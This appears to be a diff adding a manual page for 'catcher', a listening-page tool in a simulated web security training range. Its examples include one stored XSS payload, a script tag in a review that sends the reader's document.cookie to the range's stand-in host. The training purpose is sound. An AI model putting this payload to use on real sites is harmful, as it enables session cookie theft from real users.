@@ -1,0 +1,31 @@
+NAME
+       catcher - show what reached your practice listening page (Cyber Range)
+
+SYNOPSIS
+       catcher
+       catcher --clear
+
+DESCRIPTION
+       In the Web Security Lab you sometimes need a place of your own that a
+       pretend visitor's browser (or a pretend mail) can be sent to. That place
+       is http://catcher.range.example/ - a pretend listening page that belongs
+       to you. Anything that arrives there is kept, and catcher prints it: the
+       time, the address that was asked for (with everything after the /,
+       such as ?c=... carrying a stolen cookie), and mails sent to any address
+       @catcher.range.example.
+
+       Only the range's pretend browsers and mails reach it; it is not a real
+       server and nothing leaves the simulator.
+
+OPTIONS
+       -c, --clear
+              Forget everything that arrived so far.
+
+EXAMPLES
+       A review that sends the reader's cookie to your page:
+           <script>new Image().src='http://catcher.range.example/c?'+document.cookie</script>
+       Then see what arrived:
+           catcher
+
+SEE ALSO
+       curl(1), browse(1)
